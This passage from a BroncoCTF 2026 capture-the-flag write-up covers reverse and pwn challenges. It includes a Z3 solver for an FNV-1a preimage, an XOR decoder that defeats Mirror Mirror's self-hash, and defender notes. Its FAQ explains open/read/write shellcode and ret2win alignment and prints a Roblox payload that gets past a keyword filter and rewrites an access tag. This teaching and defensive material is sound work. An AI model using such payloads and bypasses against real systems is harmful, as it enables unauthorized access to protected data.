FNV-1a is not cryptographically secure but is intended as one-way for practical purposes. Solve the preimage with Z3 over a 12-lowercase-letter input:

```python
from z3 import *
letters = [BitVec(f"c{i}", 32) for i in range(12)]
s = Solver()
for c in letters:
    s.add(c >= ord('a'), c <= ord('z'))
h = BitVecVal(0x811c9dc5, 32)
for c in letters:
    h = (h ^ c) * 0x01000193
s.add(h == 0x9f58d866)
s.check()
model = s.model()
word = ''.join(chr(model[c].as_long()) for c in letters)
# "pifbekgtrlru"
```

Verify: `fnv1a("pifbekgtrlru") == 0x9f58d866` ✓, `len == 12` ✓, and `speak_checksum("pifbekgtrlru", "gremlin") == 0x740a8a98` ✓.

The recovered preimage is not an English word. That's expected; the challenge only checks the hash, not linguistic plausibility. If Z3 had returned multiple candidates the checksum test would pick the right one.

#### Step 6 — Derive the flag decrypt seed

After all finale checks pass, seed derives from final stats:

```c
seed = mix((bond * 31) ^ (combo * 0x13579bdf) ^ (energy * 13) ^ 0x510211db);
```

Winning stats: `bond = 30`, `combo = 0`, `energy = 36` (after two speaks each burning 2 energy, plus the four non-speak actions). Seed: `0xc9fcde1a`.

NEON transform at `0x100000f34` uses that seed to transform the constant data in `__TEXT,__const`. Reimplementing the vector ops in Python yields three 8-byte chunks:

```
bronco{m
ans_best
_friend}
```

Concatenated:

```
bronco{mans_best_friend}
```

#### Step 7 — Winning input to play interactively

```
<Enter>
2
3
1
6
pifbekgtrlru
4
6
gremlin
```

Per-challenge README + solver: [reverse/dog-simulator](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/reverse/dog-simulator).

Two generalisable observations from this challenge. First, FNV-1a and other non-cryptographic hashes are Z3-invertible for short inputs. FNV-1a's `hash = (hash ^ c) * 0x01000193` is a linear-ish operation over `Z_{2^32}`, and with an ASCII/alphabetic alphabet constraint Z3 solves 8-16 character preimages in seconds. This is why hash-based flag checkers using non-cryptographic hashes are trivially reversible with a modern SMT solver; if the checker needs to be one-way, use HMAC-SHA256 or similar. Second, when the challenge author writes a game with visible owner/NPC dialogue, treat every quoted phrase as a candidate hint. "Little gremlin" is not decoration when it appears on the last day and the finale checks a normalised speak input against a fixed string.

### 7. Mirror Mirror

A Python script that XOR-decrypts a hard-coded blob using a SHA-256 slice of its own source, keyed by a repeating string. Anti-debug checks are cosmetic since the decoder is visible in the source.

#### Step 1 — Read the anti-observation checks

```python
if sys.gettrace() is not None:
    return "Nice try, but the glass turns opaque. No observers allowed!"
if sys._getframe().f_code.co_name != 'verify' or __name__ != "__main__":
    return "You are looking at the mirror from a distorted angle."
```

These prevent stepping through with `pdb` and prevent importing `mirror` and calling `verify()` from a wrapper script. Neither matters, because the decoder logic is visible in the source; reimplement it standalone.

#### Step 2 — Read the self-referential SHA-256

```python
with open(__file__, 'r') as f:
    src = f.read()
    pivot = src.index("MIRROR_SURFACE_DO_NOT_SCRATCH")
    specular_map = hashlib.sha256(src[pivot:pivot+300].encode()).digest()
```

The script hashes 300 bytes of its own source, starting at the marker string. The flag is tied to the exact contents of the challenge file; if the artefact is edited before analysis (even reformatting whitespace), the digest changes and decoding produces garbage. Always operate on the original bytes from the handout.

#### Step 3 — Read the XOR loop

```python
blob = [17, 241, 10, 247, 215, 233, 146, 221, 156, 40, 37, 198,
        153, 173, 10, 103, 20, 56, 232, 116, 208, 121, 53, 12,
        122, 86, 127, 164, 109, 62, 88, 200, 127, 234, 5]

looking_glass = "MirrorMirror"
for i, b in enumerate(blob):
    reflection_byte = specular_map[i % len(specular_map)] ^ ord(looking_glass[i % len(looking_glass)])
    flag += chr(b ^ reflection_byte)
```

XOR is symmetric, so the same loop is both encryptor and decryptor. Reimplement standalone against the pristine artefact:

```python
def recover(path):
    src = Path(path).read_text()
    pivot = src.index("MIRROR_SURFACE_DO_NOT_SCRATCH")
    specular_map = hashlib.sha256(src[pivot:pivot + 300].encode()).digest()
    out = []
    for i, b in enumerate(BLOB):
        key = specular_map[i % 32] ^ ord("MirrorMirror"[i % 12])
        out.append(chr(b ^ key))
    return "".join(out)
```

Output:

```
bronco{wh0_1s_th3_f@ir3st_r3v3rs3r}
```

Per-challenge README + solver: [reverse/mirror-mirror](https://github.com/Abdelkad3r/BroncoCTF-2026/tree/main/reverse/mirror-mirror).

The pattern is a very common beginner-reverse trick: bind the encrypted payload to a hash of the file itself. The intended defensive value is "an attacker who modifies the binary breaks the payload," but that only helps if the decoder is also opaque (e.g. in an ELF section that the attacker can't read without executing the binary). When the decoder is visible plaintext Python, self-hashing is just a "don't edit the file" reminder; separate the validation environment (which can be lied to) from the decoding operation (which requires the original bytes). This is the same pattern real-world crackmes use with `MD5(current_binary_section)` self-integrity checks; the mitigation for a defender is to encrypt the decoder itself (e.g. VMProtect / Themida bytecode virtualisation), not to add more checks against the same visible plaintext.

## Cross-cutting defender notes

Six patterns recur across the BroncoCTF 2026 pwn + reverse tracks and translate directly into review or triage heuristics.

**Seccomp allowlists must confine `open()`, not just `execve()`.** Crab Trap's syscall filter permits `open`, `read`, `write`, which is exactly the set needed to exfiltrate any local file the process can reach. "No `execve`" is a shellcode-prevention posture but not a file-read-prevention posture. Real sandboxes for "no code execution" workloads need pathname-scoped file access via `landlock` (Linux ≥ 5.13), `openat2()` + `RESOLVE_BENEATH`, seccomp-bpf that inspects `open()` path arguments, or process-level `chroot`/`unveil`. The rule: enumerate what a compromised process could still read, not just what it could still spawn.

**Non-PIE + no canary + `gets()` is a 1990s pwn stack in 2026 clothes.** Proper Pwning ships with `-fno-stack-protector -no-pie`, which turns every stack buffer into a straight ret2win target. Modern toolchains default to `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2`, PIE, and `-Wl,-z,relro,-z,now` for a reason. If code review turns up any `gets()`, `strcpy(dst, user_input)`, `sprintf(dst, ...)`, or unchecked `scanf("%s", ...)` in production C, the mitigation is not the stack canary; it's replacing the function. `fgets`, `strncpy`, `snprintf`, and `scanf("%<N>s", ...)` all exist for a reason.

**x86_64 stack alignment is a real invariant.** Proper Pwning's `win+5` gadget is not a trick; it's a correct application of the SysV AMD64 ABI, which requires `rsp` to be 16-byte aligned at every `call` instruction. `ret <fn_start>` leaves `rsp` misaligned by 8 after the callee's `push rbp`, so SIMD instructions inside `system()`/`printf()` (which use `movaps` for XMM save) fault. When a ret2win reaches the target but crashes inside libc, the first debugging step is checking `rsp & 0xf` at the fault point. Fix by skipping the prologue's `endbr64; push rbp` (5 bytes on standard x86_64) or by inserting a `ret` gadget (single-byte `c3`) as a padding gadget to add 8 bytes to the stack before the target.

**Client-side validation is not a security boundary.** World's Hardestest Flag's banned-word filter runs on the Roblox client before the RemoteEvent fires. Bypassing it doesn't even require a modded client; a legitimate UI can call `string.char()` at runtime and produce a payload with no banned substring. This is the same class as HTML `maxlength`, JavaScript regex validation on form fields, and any client-side rate limiter that isn't paired with a server-side one. When implementing a bypass filter, the server must re-run the same validation on the received data, and preferably on the *canonical* form of the data (e.g. after `string.lower` normalisation, unicode NFC normalisation, and any dynamic-string reconstruction that the sandbox might permit).

**Capability rings must not include their own gating metadata.** The World's Hardestest Flag `Storage` object holds both `Value` (the flag) and `TypeTag` (the read gate). Since `write()` accepts arbitrary key/value pairs into the object, it can rewrite `TypeTag` and unlock the read. The general rule: any access-control field on an object must live in a location the object's own write API cannot reach. In practice: store ACL entries in a separate table; use read-only property descriptors (`Object.defineProperty` with `writable: false` in JS, `__slots__` + immutable metaclass in Python, sealed classes in Kotlin, private fields with no setter in Java); or gate every write on a proof-of-permission the caller can't forge.

**Non-cryptographic hashes are Z3-invertible for short inputs.** Dog Simulator's FNV-1a check `hash == 0x9f58d866` for a 12-letter lowercase input is solvable in seconds. FNV-1a, DJBX33A/DJB2, Adler-32, CRC-32, MurmurHash, xxHash: all of these are designed for hashtable performance, not preimage resistance. When a hash-based check needs to be one-way (crackme flags, license keys, anti-tamper), use HMAC-SHA256, Argon2id, or any modern KDF; when the check is over a short input, expect Z3 or a targeted brute force to invert it. The one exception is when the check is over a long input with high entropy (256-bit random tokens), in which case even a broken hash function is fine because the *search space* is what's actually protecting you.

**Self-integrity checks don't hide the payload; they only tie the payload to the file.** Mirror Mirror's `sha256(src[pivot:pivot+300])` locks the encrypted blob to the exact challenge file. A defender might think "modifying the file breaks the payload" is protection, but any attacker with the file can run the same hash + XOR loop offline. Real anti-tamper needs the decoder itself to be opaque (encrypted section decrypted at runtime, VM-obfuscated bytecode, whitebox crypto), not just the payload. Otherwise "self-hash + XOR" is a very cheap speed bump that a five-line Python solver defeats.

## Frequently asked questions

### What is BroncoCTF 2026?

BroncoCTF is a jeopardy-style Capture-The-Flag competition run by Cal Poly Pomona's Cyber Security Club (the "Broncos"). The 2026 edition ran categories including beginner, crypto, forensics, misc, pwn, reverse, and web, with a mix of challenges from 10 points (easy warmup) up to a few hundred points (harder chains). Flag format: `bronco{...}`. This writeup covers the three pwn challenges (Crab Trap, Proper Pwning, World's Hardestest Flag) and four reverse challenges (Cat Simulator, C++ Unplugged, Dog Simulator, Mirror Mirror) I solved. Per-challenge READMEs, handouts, and solver scripts are at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026).

### How does the Crab Trap ORW shellcode work?

The service's banner explicitly enumerates the seccomp policy: `open`, `read`, `write` are the only allowed syscalls. So instead of trying to spawn a shell (which needs `execve`), read `flag.txt` directly. The 50-byte x86_64 shellcode pushes the little-endian `flag.txt\0` string onto the stack, calls `open(rsp, 0)` (syscall 2, `O_RDONLY`), moves the returned fd into `rdi`, calls `read(fd, rsp, 0x100)` (syscall 0), then calls `write(1, rsp, n)` (syscall 1) using the read return value as the length. The whole payload fits comfortably in the 512-byte input limit and uses no fixed addresses (stack-relative throughout), so it survives ASLR.

### Why does Proper Pwning need `win+5` instead of `win` for the return target?

The x86_64 SysV ABI requires `rsp` to be 16-byte aligned at every `call` instruction. A normal `call foo` pushes an 8-byte return address, so `foo` starts with `rsp % 16 == 8`, and `foo`'s prologue (`push rbp; mov rbp, rsp`) realigns `rsp` back to a multiple of 16 before the function body runs. A ret2win into `foo`'s entry point is different: `ret <foo>` doesn't push anything, so `foo` starts with `rsp % 16 == 0`, and the prologue's `push rbp` misaligns it to `rsp % 16 == 8`. Any SIMD instruction inside `system()` (which internally executes `movaps` for the XMM save area) then faults on the misaligned load. Skipping the prologue's `endbr64; push rbp` (5 bytes = `0x40123b → 0x401240`) lands on `mov rbp, rsp` with the correct alignment already set. Alternative fixes: prepend a single `ret` gadget (byte `c3`) to add 8 bytes of padding before the target.

### How does the World's Hardestest Flag Roblox exploit bypass the sandbox?

The `.rbxl` binary place file contains the server-side Lua source in plaintext-string properties on Script objects, parseable without opening Roblox Studio. The `SecureDeh9001Server` script exposes `read(address)` and `write(address, table)` primitives to sandboxed user Lua. `read` blocks entries with `TypeTag == 0`; the flag entry at `Storage[0x6767]` has `TypeTag = 0`. But `write` has no ownership or key-whitelist check: it does `for k, v in pairs(new_data) do Storage[address][k] = v end`. So `write(0x6767, {TypeTag = 4})` mutates the very field `read` gates on, unlocking the read. The client-side banned-word filter (`typetag`, `flag`) is bypassed by dynamic string construction: `"Type" .. string.char(84, 97, 103)` produces the literal string `"TypeTag"` without the substring appearing in the source. Final payload: `write(26471,{["Type"..string.char(84,97,103)]=4});print(read(26471))`.

### Why is the visible `bonco{almost_there}` string in Cat Simulator a decoy?

The event's flag prefix is `bronco{...}`, not `bonco{...}`. The one-letter mismatch is a deliberate signal from the challenge author that this string is a lure. A grep-for-flag-format tool (`grep -oE '[a-z]+\{[^}]+\}'`) would surface both `bonco{almost_there}` and any real `bronco{...}` string equally, so a naive submission attempts the wrong one. The real branch requires exact counter/score/mood/talk-letter constraints (`talks=3, scratches=1, eats=1, invalid=0, score=45, mood>0, talk_letters=32`), and only then derives a mood-seeded XOR key via `mix((mood*17) ^ 0xc47b4cd0)` and decodes the true flag `bronco{fluffy_baby}`.

### How do you build the C++ Unplugged song-title dictionary?

Start from grammar anchors that unlock multiple tokens at once. `using namespace std EndGame` tells you `EndGame == ;`. The `main()` header (`main FromTheStart CountingStars argc, Abcdefu Starboy argv PieceByPiece FreshOutTheSlammer IsItOverNow BeginAgain`) unlocks `(`, `)`, `int`, `char`, `*`, `[`, `]`, `{` in a single line. Control-flow keywords (`if`, `else`, `while`, `for`, `switch`, `case`, `default`, `break`, `continue`, `return`) follow from any conditional or loop body. Operators come from comparison/assignment contexts. Once the dictionary has ~30 entries, the file translates verbatim. Sort replacements by length descending to avoid `SmallerThanThisThisIsMe` (`<=`) being cut short by the earlier `SmallerThanThis` (`<`). Special-case the three spaced character literals (`' Starboy '`, `' BeginAgain '`, `' EndOfTime '` → `'*'`, `'{'`, `'}'`) before the general pass since substituting inside single quotes would produce invalid multi-character literals.

### How does the Dog Simulator finale check work?

Fifteen constraints in the finale ladder at `0x100000e0c`. The action-count constraints (`exactly 1 bark + 1 fetch + 1 sit + 1 eat + 2 speaks, 0 zoomies`) plus the score check (`score == 55 == 10+20+15+10`) uniquely determine the action set. The `rhythm == 4` and `routine_hash == 0xf5d38524` constraints determine the *order*, which simulating from the disassembled action handlers pins to `fetch → sit → bark → speak → eat → speak`. The speak constraints (`total_letters == 19, gremlin check passed, speak_checksum == 0x740a8a98`) plus the day-6 owner line ("Last day of the week, little gremlin") force the second speak to be `gremlin` (7 letters), so the first speak must be 12 letters with FNV-1a hash `0x9f58d866`. Solving that FNV-1a preimage with Z3 gives `pifbekgtrlru` (not English; the check only cares about the hash). After all constraints pass, the flag decrypts via a NEON transform seeded by `mix((bond*31) ^ (combo*0x13579bdf) ^ (energy*13) ^ 0x510211db)`.

### Why is FNV-1a Z3-invertible for a 12-letter input?

FNV-1a is `hash = (hash ^ byte) * FNV_PRIME mod 2^32`. Multiplication and XOR modulo `2^32` are both operations Z3 handles natively via its bit-vector theory. For a 12-lowercase-letter input, the search space is `26^12 ≈ 9.5×10^16`, which is too big for brute force but trivial for constraint solving: Z3 doesn't enumerate candidates, it propagates constraints backwards from the target hash. Each input byte is constrained to `ord('a')..ord('z')`; the hash computation is unrolled into 12 bit-vector operations; the equality with `0x9f58d866` is a single `add`. Solve time on a modern laptop: seconds. The takeaway: non-cryptographic hashes designed for hashtable performance (FNV, MurmurHash, xxHash, CRC-32, Adler-32, DJB2) are not preimage-resistant. If you need a one-way check, use HMAC-SHA256, Argon2id, or scrypt.

### Why can't Mirror Mirror's anti-debug checks stop you?

The anti-debug checks (`sys.gettrace() is not None` blocks pdb; `sys._getframe().f_code.co_name != 'verify'` blocks importing and calling from another script) only defend the *validation* path; they only run if you call `verify()` in the intended context. But the decoder logic (SHA-256 of a source slice XOR'd with a repeating string) is visible in the source, so reimplementing it standalone bypasses every check. The pattern is a common beginner-reverse trick: bind an encrypted payload to a self-hash so that "any modification breaks it", but ship the decoder in plaintext. The mitigation would be to make the decoder itself opaque (encrypted, VM-bytecode-obfuscated), not to add more visible checks.

### What's the broader lesson from the BroncoCTF 2026 pwn + reverse tracks?

Read the artefact as a spec, not as ambience. The banner (Crab Trap's `Allowed syscalls: open, read, write`), the shipped source (Proper Pwning's `proper.c` + Dockerfile with build flags), the sandbox script names (`SecureDeh9001Server`), the visible strings (Cat Simulator's `bonco{almost_there}` decoy prefix, Dog Simulator's "little gremlin" owner line), the hints (C++ Unplugged's "all song titles begin with a capital letter"), and the self-referential markers (Mirror Mirror's `MIRROR_SURFACE_DO_NOT_SCRATCH` pivot) all telegraph the intended solve path. Trained triage means treating those signals as instructions. The heavy artillery (disassembly, dynamic instrumentation, Z3) still matters, but reaching for it first burns time on problems the author has already handed you.

### Where can I find the solver scripts?

Per-challenge READMEs, handouts, and solver scripts are at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026). Each challenge has a `solve.py` or `solve.sh` that reproduces the flag against a fresh instance (pwn) or from the handout artefacts (reverse). The pwn solvers use only the Python standard library. The Dog Simulator solver optionally uses `z3-solver` for the FNV-1a preimage step (or a targeted 12-letter brute force as a fallback). The Mirror Mirror solver reads the original artefact directly to reproduce the self-hash. Every solver's transcript is preserved under `artifacts/session.log` in each challenge directory.

## Closing notes

Seven challenges spanning easy warmups to a Roblox-place-file exploit, but all pulled together by the same trained-reader habit: **the challenge author telegraphs the intended attack surface, and the free work is almost always to just read what they wrote**. Crab Trap enumerates its own seccomp policy. Proper Pwning ships its own C source and Dockerfile. World's Hardestest Flag names the vulnerable script and the banned-word list in plaintext. Cat Simulator prints the wrong-prefix decoy next to the real menu strings. C++ Unplugged tells you the substitution rule in the hint. Dog Simulator's day-6 owner line names the required speak input verbatim. Mirror Mirror labels its own SHA-256 pivot with a marker string. Reversing hardness in this set is mostly a discipline problem, not a tools problem.

For adjacent event content on the site, the [Junior.Crypt 2026 pwn + reverse writeup](/ctf-writeups/junior-crypt-2026-pwn-reverse-writeup/) covers four harder native challenges from a different event (negative-index array OOB with cookie-encoded function pointers, session-to-sink UAF with fake vtable, reclassify-without-realloc heap OOB into an adjacent object's routine pointer, and a modified-TCC-compiler VM with an ELF-relocation-derived key). The [Junior.Crypt 2026 web + crypto writeup](/ctf-writeups/junior-crypt-2026-web-crypto-writeup/) walks the same event's web + crypto side (Franklin-Reiter e=3, offline Vaudenay via timing trace, 20-bit LCG, many-time pad via multiset match). The [Junior.Crypt 2026 forensic + misc + OSINT writeup](/ctf-writeups/junior-crypt-2026-forensic-misc-osint-writeup/) covers a pickle supply-chain backdoor with LedgerModel.infer trigger, an SVG clip-path ghost text trick, DOCX customXml revision replay, and a MIDI pitch-wheel steganography channel. The [R3CTF 2026 master writeup](/ctf-writeups/r3ctf-2026-writeup/) covers Microsoft SEAL CKKS delta recovery and .NET xoshiro256** state recovery. The [SEKAI CTF 2026 master writeup](/ctf-writeups/sekai-ctf-2026-writeup/) walks a single-assertion crypto puzzle and a Next.js triple-bug chain. Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is BroncoCTF 2026?","acceptedAnswer": {"@type": "Answer","text": "BroncoCTF is a jeopardy-style Capture-The-Flag competition run by Cal Poly Pomona's Cyber Security Club (the 'Broncos'). The 2026 edition ran beginner, crypto, forensics, misc, pwn, reverse, and web categories, with challenges from 10 points up to a few hundred points. Flag format bronco{...}. This writeup covers three pwn challenges (Crab Trap, Proper Pwning, World's Hardestest Flag) and four reverse challenges (Cat Simulator, C++ Unplugged, Dog Simulator, Mirror Mirror). Per-challenge READMEs and solvers at github.com/Abdelkad3r/BroncoCTF-2026."}},
    {"@type": "Question","name": "How does the Crab Trap ORW shellcode work?","acceptedAnswer": {"@type": "Answer","text": "Service banner enumerates the seccomp policy: only open, read, write are allowed. Instead of trying to spawn a shell (needs execve), read flag.txt directly. 50-byte x86_64 shellcode: push little-endian flag.txt on the stack, open(rsp, 0), read(fd, rsp, 0x100), write(1, rsp, n) using read's return length. All stack-relative, so ASLR-safe. Fits in the 512-byte input limit."}},
    {"@type": "Question","name": "Why does Proper Pwning need win+5 instead of win for the return target?","acceptedAnswer": {"@type": "Answer","text": "x86_64 SysV ABI requires rsp to be 16-byte aligned at every call. A normal call pushes 8 bytes so the callee's prologue (push rbp) realigns to 16. But ret <fn> doesn't push anything, so the callee starts already at 16-aligned rsp and push rbp misaligns to 8. SIMD instructions inside system() (movaps for XMM save) fault on that misalignment. Skipping the prologue's endbr64; push rbp (5 bytes, so target = win + 5 = 0x401240) lands on mov rbp, rsp with correct alignment already set."}},
    {"@type": "Question","name": "How does the World's Hardestest Flag Roblox exploit bypass the sandbox?","acceptedAnswer": {"@type": "Answer","text": "The .rbxl binary place ships server-side Lua source in plaintext string properties on Script objects (parseable without opening Studio). SecureDeh9001Server exposes read(address) and write(address, table). read blocks TypeTag=0 entries; the flag entry at Storage[0x6767] has TypeTag=0. But write has no key whitelist: it does 'for k,v in pairs(new_data) do Storage[address][k] = v end'. So write(0x6767, {TypeTag=4}) mutates the same field read gates on. Client-side banned-word filter is bypassed with 'Type'..string.char(84,97,103). Final payload: write(26471,{['Type'..string.char(84,97,103)]=4});print(read(26471))."}},
    {"@type": "Question","name": "Why is the visible bonco{almost_there} string in Cat Simulator a decoy?","acceptedAnswer": {"@type": "Answer","text": "The event's flag prefix is bronco{...}, not bonco{...}. The one-letter mismatch is a deliberate lure signal. Grep-for-flag-format tooling surfaces both equally so naive submissions attempt the wrong one. The real branch requires exact counter/score/mood/talk-letter constraints (talks=3, scratches=1, eats=1, invalid=0, score=45, mood>0, talk_letters=32), then derives a mood-seeded XOR key via mix((mood*17) XOR 0xc47b4cd0) and decodes bronco{fluffy_baby}."}},
    {"@type": "Question","name": "How do you build the C++ Unplugged song-title dictionary?","acceptedAnswer": {"@type": "Answer","text": "Start from grammar anchors. 'using namespace std EndGame' gives EndGame=;. The main() header unlocks (, ), int, char, *, [, ], { in one line. Control-flow keywords from any if/for/switch body. Operators from context. Sort replacements by length descending (else SmallerThanThisThisIsMe gets cut short by SmallerThanThis). Special-case spaced character literals (' Starboy ', ' BeginAgain ', ' EndOfTime ') before the general pass since substituting inside single quotes would produce invalid multi-character literals."}},
    {"@type": "Question","name": "How does the Dog Simulator finale check work?","acceptedAnswer": {"@type": "Answer","text": "15 constraints in the finale ladder at 0x100000e0c. Action counts (1 bark + 1 fetch + 1 sit + 1 eat + 2 speaks, 0 zoomies) plus score=55 fix the action set. rhythm=4 and routine_hash=0xf5d38524 fix the order (fetch->sit->bark->speak->eat->speak). Speak checks (total_letters=19, gremlin check, speak_checksum=0x740a8a98) plus the day-6 owner line 'little gremlin' force the second speak to be gremlin (7 letters), so the first must be 12 letters with FNV-1a hash 0x9f58d866. Z3 recovers 'pifbekgtrlru'. Flag decrypts via NEON transform seeded by mix((bond*31) XOR (combo*0x13579bdf) XOR (energy*13) XOR 0x510211db)."}},
    {"@type": "Question","name": "Why is FNV-1a Z3-invertible for a 12-letter input?","acceptedAnswer": {"@type": "Answer","text": "FNV-1a is hash = (hash XOR byte) * FNV_PRIME mod 2^32. Both operations map naturally to Z3's bit-vector theory. For a 12-lowercase-letter input the search space is 26^12 ~ 9.5e16 (too big for brute force) but constraint solving backpropagates from the target hash: each byte constrained to 'a'..'z', hash computation unrolled to 12 bit-vector ops, equality with target as a single add. Solves in seconds. Non-cryptographic hashes (FNV, MurmurHash, xxHash, CRC-32, DJB2) are not preimage-resistant; use HMAC-SHA256 or Argon2id for one-way checks."}},
    {"@type": "Question","name": "Why can't Mirror Mirror's anti-debug checks stop you?","acceptedAnswer": {"@type": "Answer","text": "The checks (sys.gettrace() blocks pdb; __name__ != '__main__' blocks importing) only defend the validation path. The decoder itself (SHA-256 of a 300-byte source slice XOR'd with repeating string 'MirrorMirror') is visible in plaintext Python. Reimplementing it standalone against the original file bytes bypasses every check. Mitigation would be to make the decoder itself opaque (encrypted section, VM bytecode obfuscation), not to add more visible checks."}},
    {"@type": "Question","name": "What's the broader lesson from the BroncoCTF 2026 pwn + reverse tracks?","acceptedAnswer": {"@type": "Answer","text": "Read the artefact as a spec, not as ambience. The banner (Crab Trap's syscall list), the shipped source (Proper Pwning's C + Dockerfile), the sandbox script names (SecureDeh9001Server), the visible strings (Cat Simulator's wrong-prefix decoy, Dog Simulator's 'little gremlin' owner line), the hints (C++ Unplugged capital-letter rule), and the self-referential markers (Mirror Mirror's MIRROR_SURFACE_DO_NOT_SCRATCH pivot) all telegraph the intended solve. Trained triage treats those signals as instructions."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, handouts, and solver scripts at github.com/Abdelkad3r/BroncoCTF-2026. Each has a solve.py or solve.sh that reproduces the flag from a fresh instance (pwn) or from handout artefacts (reverse). Pwn solvers use only Python stdlib. Dog Simulator optionally uses z3-solver for the FNV-1a preimage or a targeted 12-letter brute force. Mirror Mirror reads the original artefact directly for the self-hash. Session transcripts under artifacts/session.log in each challenge directory."}}
  ]
}
</script>
